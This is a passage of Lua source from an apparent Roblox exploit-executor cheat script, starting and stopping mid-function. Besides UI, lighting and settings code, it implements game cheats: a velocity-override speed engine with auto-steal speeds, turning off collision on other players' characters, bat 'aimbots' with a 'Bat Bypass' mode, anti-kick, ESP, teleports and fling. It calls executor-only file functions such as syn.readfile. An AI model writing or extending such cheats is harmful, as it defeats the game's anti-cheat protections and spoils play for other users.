        Lighting.GlobalShadows = true
        Lighting.ClockTime = preset.clock or 14
        Lighting.Brightness = preset.brightness or 2
        if preset.outAmb then Lighting.OutdoorAmbient = _vC3(preset.outAmb) end
        if preset.ambient then Lighting.Ambient = _vC3(preset.ambient) end
        if preset.sky then
            local skyInst = Instance.new("Sky")
            skyInst:SetAttribute("_AdaptDuelsSky", true)
            if preset.sky.stars then skyInst.StarCount = preset.sky.stars end
            if preset.sky.moon then skyInst.MoonAngularSize = preset.sky.moon end
            if preset.sky.sun then skyInst.SunAngularSize = preset.sky.sun end
            if preset.sky.moonTex then skyInst.MoonTextureId = "rbxasset://sky/moon.jpg" end
            skyInst.Parent = Lighting
        end
        if preset.atm then
            local atm = Instance.new("Atmosphere")
            atm:SetAttribute("_AdaptDuelsSky", true)
            atm.Density = preset.atm.dens or 0.3
            atm.Color = _vC3(preset.atm.color)
            atm.Decay = _vC3(preset.atm.decay)
            atm.Glare = preset.atm.glare or 1
            atm.Haze = preset.atm.haze or 1
            atm.Parent = Lighting
        end
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if preset.clouds and terrain then
            local clouds = Instance.new("Clouds")
            clouds:SetAttribute("_AdaptDuelsSky", true)
            clouds.Cover = preset.clouds.cover or 0.5
            clouds.Density = preset.clouds.dens or 0.5
            clouds.Color = _vC3(preset.clouds.color)
            clouds.Parent = terrain
        end
        skyTheme = mode
    end
    
    function enableVividGraphics()
        if vividGraphicsEnabled and #_vividEffects > 0 then return end
        vividGraphicsEnabled = true
        for _, eff in ipairs(_vividEffects) do
            pcall(function() eff:Destroy() end)
        end
        _vividEffects = {}
        local color = Instance.new("ColorCorrectionEffect")
        color.Parent = Lighting
        color.Saturation = 0.6; color.Contrast = 0.4; color.Brightness = 0.05
        color.TintColor = Color3.fromRGB(255, 240, 220)
        table.insert(_vividEffects, color)
        local bloom = Instance.new("BloomEffect")
        bloom.Parent = Lighting
        bloom.Intensity = 0.8; bloom.Size = 24; bloom.Threshold = 1
        table.insert(_vividEffects, bloom)
        local atmosphere = Instance.new("Atmosphere")
        atmosphere.Parent = Lighting
        atmosphere.Density = 0.3; atmosphere.Offset = 0.25
        atmosphere.Color = Color3.fromRGB(199, 199, 255)
        atmosphere.Decay = Color3.fromRGB(106, 112, 125)
        atmosphere.Glare = 0.2; atmosphere.Haze = 1
        table.insert(_vividEffects, atmosphere)
        local sun = Instance.new("SunRaysEffect")
        sun.Parent = Lighting
        sun.Intensity = 0.2; sun.Spread = 0.8
        table.insert(_vividEffects, sun)
        local dof = Instance.new("DepthOfFieldEffect")
        dof.Parent = Lighting
        dof.FocusDistance = 25; dof.InFocusRadius = 10
        dof.NearIntensity = 0.2; dof.FarIntensity = 0.4
        table.insert(_vividEffects, dof)
        task.spawn(function()
            while vividGraphicsEnabled and color and color.Parent do
                color.Contrast = 0.35 + math.sin(tick() * 2) * 0.05
                task.wait(0.03)
            end
        end)
    end
    
    function disableVividGraphics()
        vividGraphicsEnabled = false
        for _, eff in ipairs(_vividEffects) do
            pcall(function() eff:Destroy() end)
        end
        _vividEffects = {}
    end
    
    function toggleVividGraphics(on)
        if on then enableVividGraphics() else disableVividGraphics() end
        saveAllSettings(true)
    end
    
    function applyHideButtons(state)
        hideButtonsEnabled = state
        if MobilePanel then
            for _, child in ipairs(MobilePanel:GetChildren()) do
                if child:IsA("TextButton") then
                    child.Visible = not state
                end
            end
        end
        if tpBatFloatingButton then
            local frame = tpBatFloatingButton:FindFirstChild("Frame")
            if frame then frame.Visible = not state end
        end
        if instaResetFloatingButton then
            local frame = instaResetFloatingButton:FindFirstChild("Frame")
            if frame then frame.Visible = not state end
        end
        if _G.__YoutBatV2Frame then
            _G.__YoutBatV2Frame.Visible = not state
        end
    end
    
    function toggleHideButtons(on)
        applyHideButtons(on)
        if setHideButtonsVisual then setHideButtonsVisual(on) end
        saveAllSettings(true)
    end
    
    function paintFloatingBtn(btnFrame, active)
        if not btnFrame then return end
        local bg = btnFrame:FindFirstChild("BtnGrad")
        local label = btnFrame:FindFirstChild("TextLabel")
        local stroke = btnFrame:FindFirstChildOfClass("UIStroke")
        
        if active then
            btnFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            if bg then
                bg.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
                    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(245, 245, 250)),
                    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 228)),
                })
            end
            if label then label.TextColor3 = Color3.fromRGB(0, 0, 0) end
            if stroke then
                stroke.Color = Color3.fromRGB(255, 255, 255)
                stroke.Thickness = 1.5
                stroke.Transparency = 0.1
            end
        else
            btnFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
            if bg then
                bg.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(28, 28, 34)),
                    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(16, 16, 20)),
                    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(5, 5, 8)),
                })
            end
            if label then label.TextColor3 = Color3.fromRGB(200, 200, 210) end
            if stroke then
                stroke.Color = Color3.fromRGB(60, 60, 70)
                stroke.Thickness = 1
                stroke.Transparency = 0.45
            end
        end
    end
    
    function applyFloatingButtonScale()
        for _, uiScale in ipairs(_floatingUIScales) do
            if uiScale and uiScale.Parent then
                uiScale.Scale = floatingButtonScale
            end
        end
    end
    
    local function drag(f, dragZoneHeight)
        local dn, ds, sp, di = false, nil, nil, nil
        local endConn = nil
        local zone = dragZoneHeight or 99999
        local function stopDrag()
            local wasDragging = dn
            dn = false
            di = nil
            if endConn then
                endConn:Disconnect()
                endConn = nil
            end
            if wasDragging then task.defer(function() pcall(saveAllSettings) end) end
        end
        f.InputBegan:Connect(function(i)
            if uiLocked then return end
            if _isDraggingButton then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                local framePos = f.AbsolutePosition
                if i.Position.Y > framePos.Y + zone then return end
                dn = true; ds = i.Position; sp = f.Position
                if endConn then endConn:Disconnect() end
                endConn = i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then stopDrag() end
                end)
            end
        end)
        f.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                stopDrag()
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                stopDrag()
            end
        end)
        f.InputChanged:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end
        end)
        UIS.InputChanged:Connect(function(i)
            if i == di and dn then
                if uiLocked then stopDrag(); return end
                if _isDraggingButton then return end
                if not ds or not sp then return end
                local nX = sp.X.Offset + (i.Position.X - ds.X)
                local nY = sp.Y.Offset + (i.Position.Y - ds.Y)
                f.Position = UDim2.new(sp.X.Scale, nX, sp.Y.Scale, nY)
            end
        end)
    end
    
    -- =====================================================================
    -- [FIX SPEED VIOLETTE] SPEED ENGINE
    -- =====================================================================
    _G.__YoutSpeedEngine = _G.__YoutSpeedEngine or { started = false, conn = nil }
    _G.__YoutSpeedEngine.signal = nil
    do
        local _ok, _sig = pcall(function() return RunService.PreSimulation end)
        _G.__YoutSpeedEngine.signal = (_ok and _sig) or RunService.Heartbeat
    end
    
    local function _spd_isRagdollState(hum)
        if not hum then return true end
        local st = hum:GetState()
        return hum.PlatformStand or st == Enum.HumanoidStateType.Physics
            or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
    end
    
    local function _spd_shouldUseStealSpeed(isStealing)
        if speedMode then return true end
        if isStealing and CONFIG.AUTO_STEAL_ENABLED then return true end
        return false
    end
    
    local function _spd_getSelectedBoostSpeed()
        if laggerToggled or laggerCarryToggled then return LAGGER_SPEED end
        return NS
    end
    
    local function _spd_getSelectedStealSpeed()
        if laggerCarryToggled then return LAGGER_CARRY_SPEED end
        if laggerToggled then return LAGGER_SPEED end
        return CS
    end
    
    local function _spd_getTargetSpeed(isStealing)
        if _spd_shouldUseStealSpeed(isStealing) then return _spd_getSelectedStealSpeed() end
        return _spd_getSelectedBoostSpeed()
    end
    
    local function _spd_resetMovement()
        lastMoveDir = _V3zero
        _s2VelState.v = _V3new(0, _s2VelState.v.Y or 0, 0)
    end
    
    local function _spd_stop()
        if _G.__YoutSpeedEngine.conn then
            _G.__YoutSpeedEngine.conn:Disconnect()
            _G.__YoutSpeedEngine.conn = nil
        end
        _spd_resetMovement()
    end
    
    local function _spd_start()
        _spd_stop()
        _G.__YoutSpeedEngine.started = true
        _G.__YoutSpeedEngine.acc = 0
    
        _G.__YoutSpeedEngine.conn = _G.__YoutSpeedEngine.signal:Connect(function(dt)
            _G.__YoutSpeedEngine.acc = (_G.__YoutSpeedEngine.acc or 0) + (dt or 0)
            if _G.__YoutSpeedEngine.acc < 0.016 then return end
            _G.__YoutSpeedEngine.acc = 0
    
            local character = LP.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoid or not root or humanoid.Health <= 0 then return end
            if autoBatEnabled or batDesyncTpEnabled or autoBatV2Enabled
               or autoLeftEnabled or autoRightEnabled
               or dropActive or _G.IsDropping then
                _spd_resetMovement()
                return
            end
            if _spd_isRagdollState(humanoid) then
                lastMoveDir = _V3zero
                return
            end
            if _s2VelState.root ~= root or not _velChecked[root] then
                lastMoveDir = _V3zero
                _setupVelChecked(character)
                _hookVelHRP(root)
            end
            local direction
            if humanoid.MoveDirection.Magnitude > 0 then
                lastMoveDir = humanoid.MoveDirection
                direction = humanoid.MoveDirection
            elseif lastMoveDir.Magnitude > 0 then
                for key in pairs(MOVE_KEYS) do
                    if UIS:IsKeyDown(key) then
                        direction = lastMoveDir
                        break
                    end
                end
            end
            local selectedSpeed = _spd_getTargetSpeed(LP:GetAttribute("Stealing") == true)
            _applyVelocitySpeed(direction, tonumber(selectedSpeed) or 16, root)
        end)
    end
    
    local function _spd_applyNow()
        local character = LP.Character
        local hum = character and character:FindFirstChildOfClass("Humanoid")
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if not hum or not root or hum.Health <= 0 or _spd_isRagdollState(hum) then return end
        local direction = hum.MoveDirection.Magnitude > 0.05 and hum.MoveDirection or nil
        _applyVelocitySpeed(direction, _spd_getTargetSpeed(LP:GetAttribute("Stealing") == true), root)
    end
    
    local function _spd_refresh()
        _spd_start()
    end
    
    _G.__YoutRefreshSpeedEngine = _spd_refresh
    _G.__YoutStopSpeedEngine = _spd_stop
    _G.__YoutApplySpeedNow = _spd_applyNow
    
    pcall(_spd_start)
    
    LP.CharacterAdded:Connect(function(character)
        task.wait(0.5)
        _spd_resetMovement()
        local root = character:WaitForChild("HumanoidRootPart", 5)
        if root then _setupVelChecked(character); _hookVelHRP(root) end
        _spd_start()
    end)
    LP.CharacterRemoving:Connect(function()
        _spd_stop()
        _s2VelState.root = nil
    end)
    
    function setupMovementAndIndicators(char)
        if steppedConn then steppedConn:Disconnect(); steppedConn = nil end
        if movementLoop then movementLoop:Disconnect(); movementLoop = nil end
    
        local ccAcc = 0
        steppedConn = RunService.Heartbeat:Connect(function(dt)
            ccAcc = ccAcc + dt
            if ccAcc < 0.05 then return end
            ccAcc = 0
            local plist = _GetPlayersCached()
            for i = 1, #plist do
                local p = plist[i]
                if p ~= LP then
                    local ch = p.Character
                    if ch then
                        local parts = ch:GetChildren()
                        for j = 1, #parts do
                            local part = parts[j]
                            if part:IsA("BasePart") and part.CanCollide then
                                part.CanCollide = false
                            end
                        end
                    end
                end
            end
        end)
    
        movementLoop = RunService.RenderStepped:Connect(function()
            local char2 = LP.Character
            if not char2 then return end
            local hum = char2:FindFirstChildOfClass("Humanoid")
            local hrp = char2:FindFirstChild("HumanoidRootPart")
            if not hum or not hrp then return end
            if not autoBatEnabled and not autoLeftEnabled and not autoRightEnabled
               and not batDesyncTpEnabled and not autoBatV2Enabled then
                if _isRagdollState(hum) then
                    lastMoveDir = _V3zero
                else
                    local md = hum.MoveDirection
                    if md.Magnitude > 0 then
                        lastMoveDir = md
                    end
                end
            end
            if speedLabel then
                local displaySpeed = getActiveMoveSpeed()
                speedLabel.Text = string.format("%.1f  -  %s", displaySpeed, getSpeedModeName())
            end
        end)
        setupSpeedIndicator(char)
        startEnemySpeed()
    end
    
    function toggleLockUI(state)
        if state == nil then uiLocked = not uiLocked else uiLocked = state end
        if setLockUIVisual then setLockUIVisual(uiLocked) end
    end
    
    function disableAllAimbots()
        if autoBatEnabled then
            disableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobSetAutoBat then mobSetAutoBat(false) end
        end
        if batDesyncTpEnabled then stopBatDesyncTp() end
        if autoBatV2Enabled then disableBatV2() end
    end
    
    function stopAllBackgroundTasks()
        if movementLoop then movementLoop:Disconnect(); movementLoop = nil end
        if steppedConn then steppedConn:Disconnect(); steppedConn = nil end
        stopEnemySpeed()
        if stretchEnabled then disableStretch() end
        if stretchConn then stretchConn:Disconnect(); stretchConn = nil end
        if stretchFovConn then stretchFovConn:Disconnect(); stretchFovConn = nil end
        if AntiRagdollV2.Enabled then stopAntiRagdollV2() end
        if antiDieEnabled then AntiDieModule.stop() end
        if antiFlingEnabled then stopAntiFling() end
        if infiniteJumpEnabled then InfiniteJump.stop() end
        stopBatCounter()
        stopMedusaCounter()
        stopAutoSteal()
        disableAutoBat()
        if batDesyncTpEnabled then stopBatDesyncTp() end
        if autoBatV2Enabled then disableBatV2() end
        stopAutoLeft()
        stopAutoRight()
        if unwalkEnabled and not isActive then stopUnwalk() end
        if antiLagEnabled then disableAntiLag() end
        if dropActive then stopDropBrainrot() end
        if bodyLockEnabled then stopBodyLock() end
        if espEnabled then toggleESP(false) end
        _blSuppressCount = 0
        _blWasEnabled = false
        if _blRestoreTimer then pcall(task.cancel, _blRestoreTimer); _blRestoreTimer = nil end
        if _bodyLockConn then _bodyLockConn:Disconnect(); _bodyLockConn = nil end
        for _, t in ipairs(dropConnections) do
            if type(t) == "thread" then pcall(task.cancel, t)
            elseif type(t) == "RBXScriptConnection" then pcall(t.Disconnect, t) end
        end
        dropConnections = {}
        dropActive = false
        alPhase = 1
        arPhase = 1
        lastDropTime = 0
        medusaDebounce = false
        medusaLastUsed = 0
        if _G.__YoutStopSpeedEngine then pcall(_G.__YoutStopSpeedEngine) end
    end
    
    local _youtSaveState = {lastAt = 0, queued = false, writing = false, revision = 0}
    local function resolveYoutFileApi()
        local env = (getgenv and getgenv()) or _G
        local readCandidates = {readfile, syn and syn.readfile, env.readfile}
        local writeCandidates = {writefile, syn and syn.writefile, env.writefile}
        local readFn, writeFn
        for _, fn in pairs(readCandidates) do if type(fn) == "function" then readFn = fn; break end end
        for _, fn in pairs(writeCandidates) do if type(fn) == "function" then writeFn = fn; break end end
        return readFn, writeFn
    end
    
    local function youtFileExists(path)
        local readFn = resolveYoutFileApi()
        if not readFn then return false end
        local ok, data = pcall(readFn, path)
        return ok and type(data) == "string"
    end
    
    function buildConfigTable()
        local config = {
            normalSpeed = NS, carrySpeed = CS,
            laggerSpeed1 = LAGGER_SPEED, laggerSpeed2 = LAGGER_CARRY_SPEED,
            stealRadius = CONFIG.STEAL_RANGE,
            antiRagdollMode = antiRagdollMode, antiDieEnabled = antiDieEnabled,
            antiFling = antiFlingEnabled,
            infiniteJump = infiniteJumpEnabled,
            selectedStealMode = selectedStealMode,
            autoSteal = CONFIG.AUTO_STEAL_ENABLED,
            medusaCounter = medusaCounterEnabled, batCounter = batCounterEnabled,
            unwalkEnabled = unwalkEnabled,
            laggerToggled = laggerToggled, laggerCarryToggled = laggerCarryToggled,
            carryMode = speedMode, batAimbotSpeed = BAT_AIMBOT_SPEED,
            dropMode = dropMode, stretchEnabled = stretchEnabled, stretchFOV = stretchFOV,
            fovEnabled = fovEnabled, fovValue = fovValue,
            uiScale = uiScaleValue, stealBarScale = stealBarScale, animPack = currentAnimPack,
            vividGraphics = vividGraphicsEnabled,
            hideButtons = hideButtonsEnabled,
            antiLag = antiLagEnabled,
            ragdollTimerEnabled = ragdollTimerEnabled,
            tpBatEnabled = batDesyncTpEnabled and not autoBatV2Enabled,
            autoBatV2Enabled = autoBatV2Enabled,
            selectedAimbotMode = selectedAimbotMode,
            ANTI_BYPASS_AIMBOT_SPEED = _G.AceAntiBypassAimbotSpeed,
            ANTI_BYPASS_LAGGER_AIMBOT_SPEED = _G.AceAntiBypassLaggerAimbotSpeed,
            antiBypassAimbotEnabled = _G.AceAntiBypassAimbotOn == true,
            katanaSkinEnabled = katanaSkinEnabled,
            minecraftBatSkinEnabled = minecraftBatSkinEnabled,
            minecraftBatSkinColorMode = minecraftBatSkinColorMode,
            skyTheme = skyTheme, mobileButtonPositions = savedButtonPositions,
            dropBrainrotKey = {kb = KB.DropBrainrot.kb and KB.DropBrainrot.kb.Name, gp = KB.DropBrainrot.gp and KB.DropBrainrot.gp.Name},
            autoLeftKey = {kb = KB.AutoLeft.kb and KB.AutoLeft.kb.Name, gp = KB.AutoLeft.gp and KB.AutoLeft.gp.Name},
            autoRightKey = {kb = KB.AutoRight.kb and KB.AutoRight.kb.Name, gp = KB.AutoRight.gp and KB.AutoRight.gp.Name},
            autoBatKey = {kb = KB.AutoBat.kb and KB.AutoBat.kb.Name, gp = KB.AutoBat.gp and KB.AutoBat.gp.Name},
            guiHideKey = {kb = KB.GuiHide.kb and KB.GuiHide.kb.Name, gp = KB.GuiHide.gp and KB.GuiHide.gp.Name},
            carryToggleKey = {kb = KB.CarryToggle.kb and KB.CarryToggle.kb.Name, gp = KB.CarryToggle.gp and KB.CarryToggle.gp.Name},
            laggerModeKey = {kb = KB.LaggerMode.kb and KB.LaggerMode.kb.Name, gp = KB.LaggerMode.gp and KB.LaggerMode.gp.Name},
            tpBatKey = {kb = KB.TPBat.kb and KB.TPBat.kb.Name, gp = KB.TPBat.gp and KB.TPBat.gp.Name},
            batV2Key = {kb = KB.BatV2.kb and KB.BatV2.kb.Name, gp = KB.BatV2.gp and KB.BatV2.gp.Name},
            tpFloorKey = {kb = KB.TPFloor.kb and KB.TPFloor.kb.Name, gp = KB.TPFloor.gp and KB.TPFloor.gp.Name},
            tpBatFloatingPos = tpBatFloatingPos,
            batV2FloatingPos = _G.__YoutBatV2Pos,
            bodyLockEnabled = bodyLockEnabled, bodyLockRange = bodyLockRange,
            progressBarPos = savedProgressBarPos, lockUI = uiLocked,
            backgroundIndex = backgroundIndex,
            backgroundImageTransparency = backgroundImageTransparency,
            backgroundMode = backgroundMode, floatingButtonScale = floatingButtonScale,
            outfitIndex = currentOutfitIndex, themeColor = currentColorTheme,
            antiKickEnabled = antiKickEnabled,
            safeMode = antiKickEnabled,
            cleanHubShowE01Warning = CleanHubShowE01Warning,
            cleanHubAutoTPDown = CleanHubAutoTPDown,
            cleanHubAutoTPDownHeight = CleanHubAutoTPDownHeight,
            mirrorTPDown = mirrorTPDownEnabled,
            espEnabled = espEnabled,
            activeTab = activeTab,
        }
        if main then
            local basePos = _G.__YoutMainOriginalPos or main.Position
            config.mainPosition = {
                XScale = basePos.X.Scale,
                XOffset = basePos.X.Offset,
                YScale = basePos.Y.Scale,
                YOffset = basePos.Y.Offset,
            }
        end
        if pbFrame then
            config.progressBarPos = {XScale = pbFrame.Position.X.Scale, XOffset = pbFrame.Position.X.Offset, YScale = pbFrame.Position.Y.Scale, YOffset = pbFrame.Position.Y.Offset}
        end
        if MobilePanel then
            config.mobilePanelPos = {XScale = 0, XOffset = 10, YScale = 0, YOffset = 0}
            for _, btn in ipairs(MobilePanel:GetChildren()) do
                if btn:IsA("TextButton") then
                    savedButtonPositions[btn.Name] = {X = btn.Position.X.Offset, Y = btn.Position.Y.Offset}
                end
            end
            config.mobileButtonPositions = savedButtonPositions
        end
        return config
    end
    
    function saveAllSettings(force)
        if _isResetting or _isLoading then return true end
        local config = buildConfigTable()
        config.configVersion = 2
        config.userId = LP.UserId
        local encodedOk, json = pcall(function() return HS:JSONEncode(config) end)
        if not encodedOk then return false end
        if not force and json == _lastSavedJSON then return true end
        if _youtSaveState.writing or (not force and _tick() - _youtSaveState.lastAt < 0.25) then
            if not _youtSaveState.queued then
                _youtSaveState.queued = true
                task.delay(0.25, function()
                    _youtSaveState.queued = false
                    saveAllSettings(true)
                end)
            end
            return true
        end
        local readFn, writeFn = resolveYoutFileApi()
        if not readFn or not writeFn then
            warn("[Y-out Save] Executor file API is unavailable.")
            return false
        end
        _youtSaveState.writing = true
        _youtSaveState.revision = _youtSaveState.revision + 1
        config.revision = _youtSaveState.revision
        config.savedAt = os.time()
        json = HS:JSONEncode(config)
        local ok = pcall(function()
            if youtFileExists(CONFIG_FILE) then
                local previous = readFn(CONFIG_FILE)
                if type(previous) == "string" then writeFn(CONFIG_FILE .. ".backup", previous) end
            end
            writeFn(CONFIG_FILE, json)
            local readBack = readFn(CONFIG_FILE)
            if readBack ~= json then error("save verification failed") end
            HS:JSONDecode(readBack)
        end)
        _youtSaveState.writing = false
        _youtSaveState.lastAt = _tick()
        if ok then _lastSavedJSON = json else warn("[Y-out Save] Write or verification failed.") end
        return ok
    end
    
    do
        local readFn, writeFn = resolveYoutFileApi()
        if readFn and writeFn then
            local oldPath = "BloodHounds_" .. tostring(LP.UserId) .. ".json"
            local okOld, old = pcall(readFn, oldPath)
            local okNew, _ = pcall(readFn, CONFIG_FILE)
            if okOld and type(old) == "string" and not okNew then
                pcall(writeFn, CONFIG_FILE, old)
                warn("[Yout] Config migrada de " .. oldPath .. " a " .. CONFIG_FILE)
            end
        end
    end
    
    function loadAllSettings()
        local readFn = resolveYoutFileApi()
        if not readFn or not youtFileExists(CONFIG_FILE) then return false end
        local success, data = pcall(function() return HS:JSONDecode(readFn(CONFIG_FILE)) end)
        if not success or not data then return false end
        _isLoading = true
        NS = data.normalSpeed or NS
        CS = data.carrySpeed or CS
        LAGGER_SPEED = data.laggerSpeed1 or LAGGER_SPEED
        LAGGER_CARRY_SPEED = data.laggerSpeed2 or LAGGER_CARRY_SPEED
        CONFIG.STEAL_RANGE = data.stealRadius or CONFIG.STEAL_RANGE
        if radInput then radInput.Text = tostring(CONFIG.STEAL_RANGE) end
        if tonumber(data.configVersion) >= 2 and data.lockUI ~= nil then
            uiLocked = data.lockUI
        else
            uiLocked = false
        end
        mobileButtonsLocked = false
        if data.antiRagdollMode then
            antiRagdollMode = data.antiRagdollMode
        else
            antiRagdollMode = data.antiRagdoll and "v2" or "off"
        end
        antiDieEnabled = data.antiDieEnabled or false
        antiFlingEnabled = data.antiFling or false
        infiniteJumpEnabled = data.infiniteJump or false
        selectedStealMode = (data.selectedStealMode == "V2") and "V2" or "V1"
        if selectedStealMode == "V2" then
            CONFIG.STEAL_RANGE = 60
            Steal.StealRadius = 60
            if radInput then radInput.Text = "60" end
        end
        CONFIG.AUTO_STEAL_ENABLED = data.autoSteal or false
        medusaCounterEnabled = data.medusaCounter or false
        batCounterEnabled = data.batCounter or false
        unwalkEnabled = data.unwalkEnabled or data.unwalk or false
        antiLagEnabled = data.antiLag or false
        ragdollTimerEnabled = data.ragdollTimerEnabled == true
        laggerToggled = data.laggerToggled or false
        speedMode = data.carryMode or false
        laggerCarryToggled = data.laggerCarryToggled or false
        uiScaleValue = _clamp(tonumber(data.uiScale) or 78, 50, 150)
        if mainUIScale then mainUIScale.Scale = uiScaleValue / 100 end
        stealBarScale = _clamp(tonumber(data.stealBarScale) or 100, 50, 250)
        if pbScale then pbScale.Scale = stealBarScale / 100 end
    
        -- Load Bat Bypass state
        if data.selectedAimbotMode then selectedAimbotMode = data.selectedAimbotMode end
        if selectedAimbotMode == "Anti Bypass" then selectedAimbotMode = "Bat Bypass" end
        if selectedAimbotMode ~= "Bat Bypass" then selectedAimbotMode = "Normal" end
        _G.AceAntiBypassAimbotSpeed = tonumber(data.ANTI_BYPASS_AIMBOT_SPEED) or _G.AceAntiBypassAimbotSpeed or 60
        if data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED == nil or tonumber(data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED) == 58 then
            _G.AceAntiBypassLaggerAimbotSpeed = 40
        else
            _G.AceAntiBypassLaggerAimbotSpeed = tonumber(data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED) or 40
        end
        _G.AceAntiBypassAimbotOn = data.antiBypassAimbotEnabled == true
        autoBatV2Enabled = _G.AceAntiBypassAimbotOn == true
        batV2Enabled = autoBatV2Enabled
        if autoBatV2Enabled then
            task.defer(function()
                enableBatV2()
                if autoBatV2SetVisual then autoBatV2SetVisual(true) end
            end)
        elseif autoBatV2SetVisual then
            autoBatV2SetVisual(false)
        end
    
        -- Skin states (Minecraft Bat removed, only Katana remains)
        katanaSkinEnabled = data.katanaSkinEnabled or false
        if katanaSkinEnabled then
            task.defer(function()
                pcall(function() katanaSkinController.ApplySkin("KATANA") end)
            end)
        end
    
        vividGraphicsEnabled = data.vividGraphics or false
        hideButtonsEnabled = data.hideButtons or false
    
        currentColorTheme = COLOR_THEMES[data.themeColor] and data.themeColor or "White"
        selectedColor = COLOR_THEMES[currentColorTheme]
        task.defer(function() updateAllUIThemeColors(selectedColor) end)
    
        antiKickEnabled = data.antiKickEnabled == true or data.safeMode == true
        CleanHubShowE01Warning = data.cleanHubShowE01Warning == true
        CleanHubAutoTPDown = data.cleanHubAutoTPDown == true
        CleanHubAutoTPDownHeight = _clamp(tonumber(data.cleanHubAutoTPDownHeight) or 20, 0, 500)
        mirrorTPDownEnabled = data.mirrorTPDown == true
        espEnabled = data.espEnabled == true
    
        local tpBatStateLoaded = data.tpBatEnabled or false
        if autoBatV2Enabled and tpBatStateLoaded then tpBatStateLoaded = false end
        if tpBatStateLoaded then
            task.defer(function()
                pcall(function()
                    startBatDesyncTp()
                    if batDesyncTpSetVisual then batDesyncTpSetVisual(true) end
                    updateTpBatButtonWithAntiDie(true)
                end)
            end)
        else
            if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
            updateTpBatButtonWithAntiDie(false)
        end
        skyTheme = data.skyTheme or "Off"
        if skyTheme ~= "Off" then pcall(applyCustomSky, skyTheme) end
        if skySelectorLabel then skySelectorLabel.Text = skyTheme end
        if data.animPack and ANIM_PACKS[data.animPack] then
            pcall(startAnimPack, data.animPack)
        else
            currentAnimPack = "Off"
            stopAnimPack()
        end
        local function lk(e, d)
            if not d then return end
            if d.kb and Enum.KeyCode[d.kb] then e.kb = Enum.KeyCode[d.kb] end
            if d.gp and Enum.KeyCode[d.gp] then e.gp = Enum.KeyCode[d.gp] end
        end
        lk(KB.DropBrainrot, data.dropBrainrotKey)
        lk(KB.AutoLeft, data.autoLeftKey)
        lk(KB.AutoRight, data.autoRightKey)
        lk(KB.AutoBat, data.autoBatKey)
        lk(KB.GuiHide, data.guiHideKey)
        lk(KB.CarryToggle, data.carryToggleKey)
        lk(KB.LaggerMode, data.laggerModeKey)
        lk(KB.TPBat, data.tpBatKey)
        lk(KB.BatV2, data.batV2Key)
        lk(KB.TPFloor, data.tpFloorKey)
        if data.mobileButtonPositions then savedButtonPositions = data.mobileButtonPositions end
        if data.mobilePanelPos then savedMobilePanelPos = data.mobilePanelPos end
        if data.mainPosition and main then
            main.AnchorPoint = Vector2.new(0.5, 0.5)
            main.Position = UDim2.new(0.5, 0, 0.5, 0)
            _G.__YoutMainOriginalPos = main.Position
        end
        if data.tpBatFloatingPos then tpBatFloatingPos = data.tpBatFloatingPos end
        if data.batV2FloatingPos then _G.__YoutBatV2Pos = data.batV2FloatingPos end
        if data.progressBarPos then savedProgressBarPos = data.progressBarPos end
        if data.bodyLockEnabled ~= nil then
            bodyLockEnabled = data.bodyLockEnabled
            if bodyLockEnabled then
                task.defer(function()
                    if bodyLockSetVisual then bodyLockSetVisual(true) end
                    startBodyLock()
                end)
            end
        end
        if data.bodyLockRange then
            bodyLockRange = data.bodyLockRange
            if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
        end
        dropMode = data.dropMode or 1
        stretchEnabled = data.stretchEnabled or false
        stretchFOV = data.stretchFOV or 120
        fovEnabled = data.fovEnabled or false
        fovValue = data.fovValue or 70
        BAT_AIMBOT_SPEED = data.batAimbotSpeed or BAT_AIMBOT_SPEED
        backgroundIndex = data.backgroundIndex or 1
        backgroundImageTransparency = data.backgroundImageTransparency or 0
        backgroundMode = data.backgroundMode == "None" and "None" or "Background 1"
        floatingButtonScale = data.floatingButtonScale or 1
        if data.outfitIndex and data.outfitIndex >= 1 and data.outfitIndex <= #OUTFITS then
            currentOutfitIndex = data.outfitIndex
            task.defer(function()
                pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
                if outfitSelectorLabel then
                    outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label
                end
            end)
        end
        if _G._youtStealModeSetter then
            task.defer(function() _G._youtStealModeSetter(selectedStealMode) end)
        end
        if vividGraphicsEnabled then
            task.defer(function() pcall(enableVividGraphics) end)
        else
            task.defer(function() pcall(disableVividGraphics) end)
        end
        autoBatEnabled = false
        autoLeftEnabled = false
        autoRightEnabled = false
        if dropModeBtnRef then dropModeBtnRef.Text = dropMode == 1 and "Fling" or "Jump Drop" end
        refreshSpeedModeLabel()
        if fovEnabled then
            task.defer(function() pcall(enableCustomFov) end)
        end
        if fovSliderSet then
            fovSliderSet(fovValue)
        end
        if setFovVisual then
            setFovVisual(fovEnabled)
        end
        -- Restore active tab
        if data.activeTab and tabPages and tabPages[data.activeTab] then
            activeTab = data.activeTab
        end
